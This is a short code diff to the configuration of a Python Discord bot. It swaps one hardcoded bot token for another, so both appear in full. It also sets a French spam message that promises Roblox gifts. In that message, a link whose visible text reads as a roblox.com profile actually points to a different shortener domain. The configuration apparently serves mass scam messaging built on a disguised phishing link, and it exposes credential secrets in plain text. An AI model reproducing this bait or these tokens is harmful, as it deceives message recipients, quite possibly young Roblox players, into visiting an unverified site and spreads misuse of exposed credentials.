@@ -2,8 +2,7 @@ import discord
 from discord.ext import commands
 
 # ================= CONFIGURATION =================
-TOKEN = "
-MTUzNjg5NDM1OTE4ODc5OTU4OA.GslHd5.TKD2nK_3vpxdHzasUGbISiqKXvNKOoGvwpxvMo" # Remplace par ton token
+TOKEN = "MTUzNjg5NDM1OTE4ODc5OTU4OA.GZotCl.HWijn9Sc3ZqneoUjXi3rfKp3OfQ_rXxrs7-zqE" # Remplace par ton token
 MESSAGE = "HEY ! va m'ajouter sur Roblox et envoie moi un message sur le jeu ! plein de cadeau a gagner !![https*:*//www.roblox.com/users/8024034859/profile](https://rblx.pk/Sas-k84t)" 
 # =================================================
 
